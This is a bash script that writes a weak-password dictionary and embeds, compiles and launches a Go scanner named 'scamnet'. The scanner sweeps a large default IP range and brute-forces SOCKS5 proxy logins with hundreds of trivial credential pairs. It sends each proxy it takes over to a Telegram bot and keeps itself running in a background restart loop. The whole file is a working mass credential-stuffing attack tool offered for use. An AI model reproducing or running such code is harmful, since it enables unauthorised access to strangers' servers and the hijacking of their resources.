#!/bin/bash
# main.sh - 完整单文件（内嵌 Go 源码、弱口令、守护脚本）
set -euo pipefail
IFS=$'\n\t'

RED='\033[31m'; GREEN='\033[32m'; YELLOW='\033[33m'; BLUE='\033[34m'; NC='\033[0m'

LOG_DIR="logs"; mkdir -p "$LOG_DIR"
LATEST_LOG="$LOG_DIR/latest.log"
GUARD_STDOUT="$LOG_DIR/guard_stdout.log"
GO_BIN="$LOG_DIR/scamnet_go"
VALID_FILE="socks5_valid.txt"
WEAK_FILE="$LOG_DIR/weak.txt"

log() { echo -e "${BLUE}[$(date '+%H:%M:%S')]${NC} $*"; }
err() { echo -e "${RED}[$(date '+%H:%M:%S')] [!] $*${NC}" >&2; }
succ() { echo -e "${GREEN}[$(date '+%H:%M:%S')] [+] $*${NC}"; }

# require go
if ! command -v go >/dev/null 2>&1; then
    err "未找到 Go，请先安装（例如：apt install golang-go -y）"
    exit 1
fi

# ---------------- IP / PORT 输入 ----------------
DEFAULT_START="47.76.215.0"
DEFAULT_END="47.255.255.255"
read_ip() { echo -e "${YELLOW}$1（默认: $2）:${NC}"; read -r input; eval "$3=\"\${input:-$2}\""; }
read_ip "起始 IP" "$DEFAULT_START" START_IP
read_ip "结束 IP" "$DEFAULT_END" END_IP

if ! [[ $START_IP =~ ^[0-9]{1,3}(\.[0-9]{1,3}){3}$ ]] || ! [[ $END_IP =~ ^[0-9]{1,3}(\.[0-9]{1,3}){3}$ ]]; then
    err "IP 格式错误"; exit 1
fi
if [ "$(printf '%s\n' "$START_IP" "$END_IP" | sort -V | head -n1)" != "$START_IP" ]; then
    err "起始 IP 必须 ≤ 结束 IP"; exit 1
fi
succ "范围: $START_IP - $END_IP"

echo -e "${YELLOW}端口（逗号或空格分隔，支持范围，例如: 1080,1080-1085,3128；默认: 1080,8080,8888,3128）:${NC}"
read -r PORT_INPUT
PORT_INPUT=${PORT_INPUT:-1080,8080,8888,3128}
PORTS=$(echo "$PORT_INPUT" | tr ',' ' ')
succ "端口: $PORT_INPUT"

echo -e "${YELLOW}Telegram Bot Token（可选，回车跳过）:${NC}"; read -r TELEGRAM_TOKEN
echo -e "${YELLOW}Telegram Chat ID（可选，回车跳过）:${NC}"; read -r TELEGRAM_CHATID
if [[ -n $TELEGRAM_TOKEN && -n $TELEGRAM_CHATID ]]; then
    succ "Telegram 启用"
else
    TELEGRAM_TOKEN=""; TELEGRAM_CHATID=""
    log "Telegram 禁用"
fi

# ---------------- write weak.txt ----------------
log "正在创建弱口令字典：$WEAK_FILE"
cat > "$WEAK_FILE" <<'EOF'
# 完整弱口令列表（内嵌）
admin:admin
::  
0:0
00:00
000:000
0000:0000
00000:00000
000000:000000
1:1
11:11
111:111
1111:1111
11111:11111
111111:111111
2:2
22:22
222:222
2222:2222
22222:22222
222222:222222
3:3
33:33
333:333
3333:3333
33333:33333
333333:333333
4:4
44:44
444:444
4444:4444
44444:44444
444444:444444
5:5
55:55
555:555
5555:5555
55555:55555
555555:555555
6:6
66:66
666:666
6666:6666
66666:66666
666666:666666
7:7
77:77
777:777
7777:7777
77777:77777
777777:777777
8:8
88:88
888:888
8888:8888
88888:88888
888888:888888
9:9
99:99
999:999
9999:9999
99999:99999
999999:999999
1080:1080
123:123
123:321
123:456
123:abc
123:qwe
1234:1234
1234:4321
1234:5678
1234:abcd
1234:qwer
12345:12345
12345:54321
12345:67890
12345:678910
12345:abcde
12345:qwert
123456:123456
123456:654321
123456:abcdef
123456:qwerty
123456:qwert
12345678:12345678
12345678:87654321
123456789:123456789
123456789:987654321
123459:123459
12349:12349
1239:1239
321:321
520:520
520:1314
69:69
6969:6969
696969:696969
a:a
a:b
aa:aa
aaa:aaa
aaaa:aaaa
aaaaa:aaaaa
aaaaaa:aaaaaa
aaa:111
aaa:123
aaa:bbb
a123:a123
aa123:aa123
aaa123:aaa123
aa123456:aa123456
a123456:a123456
123aa:123aa
123aaa:123aaa
123abc:123abc
ab:ab
ab:cd
abc:123
abc:abc
abc:cba
abc:def
abcdefg:abcdefg
abc123:abc123
abcde:abcde
admin:
admin:123
admin:123456
admin123:admin
as:df
asd:asd
asd:fgh
awsl:awsl
b:b
bb:bb
bbb:bbb
bbbb:bbbb
bbbbb:bbbbb
bbbbbb:bbbbbb
c:c
cc:cc
ccc:ccc
cccc:cccc
ccccc:ccccc
cccccc:cccccc
cnmb:cnmb
d:d
dd:dd
ddd:ddd
dddd:dddd
ddddd:ddddd
dddddd:dddddd
demo:demo
e:e
ee:ee
eee:eee
eeee:eeee
eeeee:eeeee
eeeeee:eeeeee
f:f
ff:ff
fff:fff
ffff:ffff
fffff:fffff
ffffff:ffffff
fuckyou:fuckyou
g:g
gg:gg
ggg:ggg
gggg:gggg
ggggg:ggggg
gggggg:gggggg
guest:guest
h:h
hh:hh
hhh:hhh
hhhh:hhhh
hhhhh:hhhhh
hhhhhh:hhhhhh
hello:hello
i:i
ii:ii
iii:iii
iiii:iiii
iiiii:iiiii
iiiiii:iiiiii
j:j
jj:jj
jjj:jjj
jjjj:jjjj
jjjjj:jjjjj
jjjjjj:jjjjjj
k:k
kk:kk
kkk:kkk
kkkk:kkkk
kkkkk:kkkkk
kkkkkk:kkkkkk
l:l
ll:ll
lll:lll
llll:llll
lllll:lllll
llllll:llllll
love:love
m:m
mm:mm
mmm:mmm
mmmm:mmmm
mmmmm:mmmmm
mmmmmm:mmmmmm
n:n
nn:nn
nnn:nnn
nnnn:nnnn
nnnnn:nnnnn
nnnnnn:nnnnnn
nmsl:nmsl
o:o
oo:oo
ooo:ooo
oooo:oooo
ooooo:ooooo
oooooo:oooooo
p:p
pp:pp
ppp:ppp
pppp:pppp
ppppp:ppppp
pppppp:pppppp
password:password
proxy:proxy
q:q
qaq:qaq
qaq:qwq
qq:qq
qqq:qqq
qqqq:qqqq
qqqqq:qqqqq
qqqqqq:qqqqqq
qwe:123
qwe:asd
qwe:qwe
qwe123:qwe123
qweasd:qweasd
qwer:1234
qwer:qwer
qwert:12345
qwert:qwert
qwerty:123456
qwerty:qwerty
qwq:qaq
qwq:qwe
qwq:qwq
r:r
rr:rr
rrr:rrr
rrrr:rrrr
rrrrr:rrrrr
rrrrrr:rrrrrr
root:root
s:s
s5:s5
ss:ss
sss:sss
ssss:ssss
sssss:sssss
ssssss:ssssss
socks:socks
socks5:socks5
t:t
test:test
test123:test123
tt:tt
ttt:ttt
tttt:tttt
ttttt:ttttt
tttttt:tttttt
u:u
user:123
user:1234
user:12345
user:123456
user:pass
user:password
user:pwd
user:user
username:username
uu:uu
uuu:uuu
uuuu:uuuu
uuuuu:uuuuu
uuuuuu:uuuuuu
v:v
vv:vv
vvv:vvv
vvvv:vvvv
vvvvv:vvvvv
vvvvvv:vvvvvv
w:w
wsnd:wsnd
ww:ww
www:www
wwww:wwww
wwwww:wwwww
wwwwww:wwwwww
x:x
xx:xx
xxx:xxx
xxxx:xxxx
xxxxx:xxxxx
xxxxxx:xxxxxx
y:y
yy:yy
yyy:yyy
yyyy:yyyy
yyyyy:yyyyy
yyyyyy:yyyyyy
z:z
zz:zz
zzz:zzz
zzzz:zzzz
zzzzz:zzzzz
zzzzzz:zzzzzz
EOF

# ---------------- generate embedded Go source ----------------
log "生成并写入 scamnet.go（完整内嵌实现）..."
cat > scamnet.go <<'GOEOF'
package main

import (
	"bufio"
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/sync/semaphore"
)

// Configurable via flags
var (
	startIP    string
	endIP      string
	portsStr   string
	tgToken    string
	tgChat     string
	batchSize  int
	maxConc    int
	timeoutSec int
	retries    int
)

// Files
var (
	validFile = "socks5_valid.txt"
	weakFile  = "logs/weak.txt"
)

// In-memory weak pairs and result cache
var weakPairs [][2]string
var validCache = struct {
	sync.Mutex
	list []string
}{}
var writeBatch = 50 // default batch flush size; can be changed by editing this constant

// small stats
var seen sync.Map
var countryCache sync.Map
var statsMu sync.Mutex
var stats = map[string]int{}

// IPInfo for httpbin.org/ip
type IPInfo struct {
	Origin string `json:"origin"`
}

func loadWeakPairs() {
	data, err := ioutil.ReadFile(weakFile)
	if err != nil {
		weakPairs = append(weakPairs, [2]string{"admin", "admin"})
		return
	}
	lines := strings.Split(string(data), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		parts := strings.SplitN(line, ":", 2)
		user := parts[0]
		pass := ""
		if len(parts) > 1 {
			pass = parts[1]
		}
		weakPairs = append(weakPairs, [2]string{user, pass})
	}
}

func saveResult(result string) {
	validCache.Lock()
	validCache.list = append(validCache.list, result)
	if len(validCache.list) >= writeBatch {
		f, _ := os.OpenFile(validFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		for _, r := range validCache.list {
			fmt.Fprintln(f, r)
		}
		f.Close()
		validCache.list = nil
	}
	validCache.Unlock()
}

func flushResults() {
	validCache.Lock()
	if len(validCache.list) > 0 {
		f, _ := os.OpenFile(validFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		for _, r := range validCache.list {
			fmt.Fprintln(f, r)
		}
		f.Close()
		validCache.list = nil
	}
	validCache.Unlock()
}

func ipToInt(ip string) uint32 {
	parts := strings.Split(ip, ".")
	a, _ := strconv.Atoi(parts[0])
	b, _ := strconv.Atoi(parts[1])
	c, _ := strconv.Atoi(parts[2])
	d, _ := strconv.Atoi(parts[3])
	return uint32(a)<<24 | uint32(b)<<16 | uint32(c)<<8 | uint32(d)
}
func intToIP(n uint32) string {
	return fmt.Sprintf("%d.%d.%d.%d", n>>24&255, n>>16&255, n>>8&255, n&255)
}

func parsePorts(s string) []int {
	s = strings.ReplaceAll(s, " ", "")
	s = strings.ReplaceAll(s, ",", " ")
	var ports []int
	for _, p := range strings.Fields(s) {
		if strings.Contains(p, "-") {
			parts := strings.SplitN(p, "-", 2)
			start, _ := strconv.Atoi(parts[0])
			end, _ := strconv.Atoi(parts[1])
			for i := start; i <= end; i++ {
				if i > 0 && i <= 65535 {
					ports = append(ports, i)
				}
			}
		} else {
			i, _ := strconv.Atoi(p)
			if i > 0 && i <= 65535 {
				ports = append(ports, i)
			}
		}
	}
	return ports
}

// raw SOCKS5 handshake + GET /ip via tunnel
func testSocks5Probe(ip string, port int, user, pass string) (bool, int, string) {
	start := time.Now()
	deadline := time.Duration(timeoutSec) * time.Second
	address := fmt.Sprintf("%s:%d", ip, port)
	conn, err := net.DialTimeout("tcp", address, deadline)
	if err != nil {
		return false, int(time.Since(start).Milliseconds()), ""
	}
	_ = conn.SetDeadline(time.Now().Add(deadline))

	// greeting
	var methods []byte
	if user != "" || pass != "" {
		methods = []byte{0x00, 0x02}
	} else {
		methods = []byte{0x00}
	}
	greet := []byte{0x05, byte(len(methods))}
	greet = append(greet, methods...)
	if _, err = conn.Write(greet); err != nil {
		conn.Close()
		return false, int(time.Since(start).Milliseconds()), ""
	}
	// selection
	buf := make([]byte, 2)
	if _, err = io.ReadFull(conn, buf); err != nil {
		conn.Close()
		return false, int(time.Since(start).Milliseconds()), ""
	}
	if buf[0] != 0x05 {
		conn.Close()
		return false, int(time.Since(start).Milliseconds()), ""
	}
	method := buf[1]
	if method == 0xFF {
		conn.Close()
		return false, int(time.Since(start).Milliseconds()), ""
	}
	if method == 0x02 {
		ub := []byte(user)
		pb := []byte(pass)
		req := []byte{0x01, byte(len(ub))}
		req = append(req, ub...)
		req = append(req, byte(len(pb)))
		req = append(req, pb...)
		if _, err = conn.Write(req); err != nil {
			conn.Close()
			return false, int(time.Since(start).Milliseconds()), ""
		}
		resp := make([]byte, 2)
		if _, err = io.ReadFull(conn, resp); err != nil {
			conn.Close()
			return false, int(time.Since(start).Milliseconds()), ""
		}
		if resp[1] != 0x00 {
			conn.Close()
			return false, int(time.Since(start).Milliseconds()), ""
		}
	}

	// CONNECT httpbin.org:80
	domain := "httpbin.org"
	req := []byte{0x05, 0x01, 0x00, 0x03, byte(len(domain))}
	req = append(req, []byte(domain)...)
	req = append(req, []byte{0x00, 0x50}...) // port 80
	if _, err = conn.Write(req); err != nil {
		conn.Close()
		return false, int(time.Since(start).Milliseconds()), ""
	}
	hdr := make([]byte, 4)
	if _, err = io.ReadFull(conn, hdr); err != nil {
		conn.Close()
		return false, int(time.Since(start).Milliseconds()), ""
	}
	if hdr[1] != 0x00 {
		conn.Close()
		return false, int(time.Since(start).Milliseconds()), ""
	}
	atyp := hdr[3]
	switch atyp {
	case 0x01:
		_, _ = io.ReadFull(conn, make([]byte, 4))
	case 0x04:
		_, _ = io.ReadFull(conn, make([]byte, 16))
	case 0x03:
		lenb := make([]byte, 1)
		if _, err = io.ReadFull(conn, lenb); err != nil {
			conn.Close()
			return false, int(time.Since(start).Milliseconds()), ""
		}
		dl := int(lenb[0])
		_, _ = io.ReadFull(conn, make([]byte, dl))
	}
	_, _ = io.ReadFull(conn, make([]byte, 2))

	// simple GET /ip
	reqStr := "GET /ip HTTP/1.1\r\nHost: httpbin.org\r\nConnection: close\r\nUser-Agent: scan\r\n\r\n"
	if _, err = conn.Write([]byte(reqStr)); err != nil {
		conn.Close()
		return false, int(time.Since(start).Milliseconds()), ""
	}
	respBuf := make([]byte, 2048)
	n, err := conn.Read(respBuf)
	if err != nil && err != io.EOF {
		// allow partial read
	}
	conn.Close()
	if n == 0 {
		return false, int(time.Since(start).Milliseconds()), ""
	}
	body := string(respBuf[:n])
	idx := strings.Index(body, "{")
	if idx >= 0 {
		body = body[idx:]
	}
	var info IPInfo
	if err := json.Unmarshal([]byte(body), &info); err != nil {
		// if HTTP present, treat as success with unknown origin
		if !strings.Contains(body, "HTTP/1.1") && !strings.Contains(body, "HTTP/2") {
			return false, int(time.Since(start).Milliseconds()), ""
		}
		return true, int(time.Since(start).Milliseconds()), "XX"
	}
	if info.Origin == "" {
		return true, int(time.Since(start).Milliseconds()), "XX"
	}
	return true, int(time.Since(start).Milliseconds()), info.Origin
}

func quickCountryLookup(ip string) string {
	clients := []string{
		"https://ipinfo.io/" + ip + "/country",
		"http://ip-api.com/line/" + ip + "?fields=countryCode",
	}
	for _, u := range clients {
		client := &http.Client{Timeout: 3 * time.Second}
		if resp, err := client.Get(u); err == nil {
			b, _ := ioutil.ReadAll(resp.Body)
			resp.Body.Close()
			c := strings.TrimSpace(string(b))
			if len(c) == 2 && regexp.MustCompile(`^[A-Z]{2}$`).MatchString(c) {
				return c
			}
		}
	}
	return "XX"
}

func sendTelegram(msg string) {
	if tgToken == "" || tgChat == "" {
		return
	}
	urlStr := "https://api.telegram.org/bot" + tgToken + "/sendMessage"
	data := url.Values{}
	data.Set("chat_id", tgChat)
	data.Set("text", msg)
	data.Set("parse_mode", "HTML")
	http.PostForm(urlStr, data)
}

func saveAndNotify(ip string, port int, user, pass, origin string, lat int) {
	country := "XX"
	if origin != "" {
		if c, ok := countryCache.Load(origin); ok {
			country = c.(string)
		} else {
			country = quickCountryLookup(origin)
			countryCache.Store(origin, country)
		}
	}
	auth := ""
	if user != "" || pass != "" {
		auth = user + ":" + pass + "@"
	}
	result := fmt.Sprintf("socks5://%s%s:%d#%s", auth, ip, port, country)
	saveResult(result)
	statsMu.Lock()
	stats[country]++
	statsMu.Unlock()
	fmt.Printf("[+] %s (%dms)\n", result, lat)
	if tgToken != "" && tgChat != "" {
		go sendTelegram(fmt.Sprintf("New: <code>%s</code>\nDelay: %dms | %s", result, lat, country))
	}
}

func scanTarget(ip string, port int) {
	key := fmt.Sprintf("%s:%d", ip, port)
	if _, ok := seen.Load(key); ok {
		return
	}
	seen.Store(key, true)

	perTargetConc := 6
	ch := make(chan struct{}, perTargetConc)
	var wg sync.WaitGroup
	found := int32(0)

	for _, pair := range weakPairs {
		if found == 1 {
			break
		}
		user := pair[0]
		pass := pair[1]
		for r := 0; r < retries; r++ {
			if found == 1 {
				break
			}
			ch <- struct{}{}
			wg.Add(1)
			go func(u, p string) {
				defer wg.Done()
				defer func() { <-ch }()
				ok, lat, origin := testSocks5Probe(ip, port, u, p)
				if ok {
					found = 1
					saveAndNotify(ip, port, u, p, origin, lat)
				}
			}(user, pass)
			time.Sleep(8 * time.Millisecond)
		}
	}
	wg.Wait()

	if found == 0 {
		for r := 0; r < retries; r++ {
			ok, lat, origin := testSocks5Probe(ip, port, "", "")
			if ok {
				saveAndNotify(ip, port, "", "", origin, lat)
				break
			}
		}
	}
}

func scanBatch(start, end uint32, ports []int) {
	sem := semaphore.NewWeighted(int64(maxConc))
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	var wg sync.WaitGroup
	for ip := start; ip <= end; ip++ {
		s := intToIP(ip)
		for _, p := range ports {
			if err := sem.Acquire(ctx, 1); err != nil {
				continue
			}
			wg.Add(1)
			go func(ipStr string, port int) {
				defer wg.Done()
				defer sem.Release(1)
				scanTarget(ipStr, port)
			}(s, p)
		}
	}
	wg.Wait()
}

func dedupAndReport() {
	flushResults()
	f, err := os.Open(validFile)
	if err != nil {
		fmt.Printf("[!] open %s err: %v\n", validFile, err)
		return
	}
	defer f.Close()
	sc := bufio.NewScanner(f)
	m := make(map[string]struct{})
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		m[line] = struct{}{}
	}
	out, _ := os.Create(validFile + ".tmp")
	out.WriteString("# Scamnet Go v1.9 - " + time.Now().Format("2006-01-02 15:04:05") + "\n")
	list := make([]string, 0, len(m))
	for k := range m {
		list = append(list, k)
	}
	sort.Strings(list)
	for _, l := range list {
		out.WriteString(l + "\n")
	}
	out.Close()
	os.Rename(validFile+".tmp", validFile)
	fmt.Printf("[+] scan finished → %s (%d)\n", validFile, len(list))
	if tgToken != "" && tgChat != "" {
		sendTelegram(fmt.Sprintf("Scan completed! Total <b>%d</b> valid proxies", len(list)))
	}
}

func main() {
	flag.StringVar(&startIP, "start", "", "Start IP")
	flag.StringVar(&endIP, "end", "", "End IP")
	flag.StringVar(&portsStr, "ports", "1080", "Ports")
	flag.StringVar(&tgToken, "tg-token", "", "Telegram Token")
	flag.StringVar(&tgChat, "tg-chat", "", "Telegram Chat")
	flag.IntVar(&batchSize, "batch", 1000, "Batch size")
	flag.IntVar(&maxConc, "conc", 300, "Max concurrent")
	flag.IntVar(&timeoutSec, "timeout", 6, "Timeout seconds")
	flag.IntVar(&retries, "retries", 3, "Retries")
	flag.Parse()

	if startIP == "" || endIP == "" {
		fmt.Println("Usage: scamnet_go -start 1.1.1.1 -end 1.1.1.255 -ports 1080,3128")
		os.Exit(1)
	}

	loadWeakPairs()

	start := ipToInt(startIP)
	end := ipToInt(endIP)
	ports := parsePorts(portsStr)

	fmt.Printf("[*] targets: %d | ports per target: %d | weak pairs: %d | conc: %d\n",
		(uint64(end)-uint64(start)+1)*uint64(len(ports)), len(ports), len(weakPairs), maxConc)

	scanBatch(start, end, ports)
	dedupAndReport()
}
GOEOF

# ---------------- build Go binary ----------------
log "初始化 go module 并编译..."
go mod init scamnet 2>/dev/null || true
go get golang.org/x/sync/semaphore 2>/dev/null || true
# build
GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o "$GO_BIN" scamnet.go
if [ $? -ne 0 ]; then
    err "Go 编译失败，请检查环境与错误日志（如果有）"
    exit 1
fi
succ "Go 扫描器编译完成 → $GO_BIN"

# ---------------- prepare guard script (variables expanded now) ----------------
GUARD_SCRIPT="$LOG_DIR/scamnet_guard.sh"
cat > "$GUARD_SCRIPT" << EOF
#!/bin/bash
LOG="$LATEST_LOG"
MAX_LINES=500
GO_BIN="$GO_BIN"
START_IP="$START_IP"
END_IP="$END_IP"
PORTS="$PORT_INPUT"
TELEGRAM_TOKEN="$TELEGRAM_TOKEN"
TELEGRAM_CHATID="$TELEGRAM_CHATID"

> "\$LOG"
echo "[GUARD] \$(date '+%Y-%m-%d %H:%M:%S') - Scamnet v1.9 启动" | tee -a "\$LOG"
echo "[GUARD] 范围: \$START_IP ~ \$END_IP | 端口: \$PORTS" | tee -a "\$LOG"

while :; do
    echo "[GUARD] \$(date '+%Y-%m-%d %H:%M:%S') - 开始扫描..." | tee -a "\$LOG"
    "\$GO_BIN" -start "\$START_IP" -end "\$END_IP" -ports "\$PORTS" \
        -tg-token "\$TELEGRAM_TOKEN" -tg-chat "\$TELEGRAM_CHATID" \
        -batch 100 -conc 50 -timeout 12 -retries 3 \
        2>&1 | grep -E '^\[\+\]|\[GUARD\]|\[DEBUG\]' | tee -a "\$LOG"
    tail -n "\$MAX_LINES" "\$LOG" > "\$LOG.tmp" 2>/dev/null && mv "\$LOG.tmp" "\$LOG"
    echo "[GUARD] \$(date '+%Y-%m-%d %H:%M:%S') - 本轮结束，3秒后重启..." | tee -a "\$LOG"
    sleep 3
done
EOF

chmod +x "$GUARD_SCRIPT"

# ---------------- start guard ----------------
pkill -f "scamnet_guard.sh" 2>/dev/null || true
sleep 1
ulimit -n 65535 2>/dev/null || true
nohup bash "$GUARD_SCRIPT" > "$GUARD_STDOUT" 2>&1 &
succ "守护进程已启动！PID: $!"
log "日志: tail -f $LATEST_LOG"
log "守护 stdout: tail -f $GUARD_STDOUT"
log "结果文件: $VALID_FILE"
log "只看成功: tail -f $LATEST_LOG | grep '^\\[+]'"
log "停止: pkill -f scamnet_guard.sh"
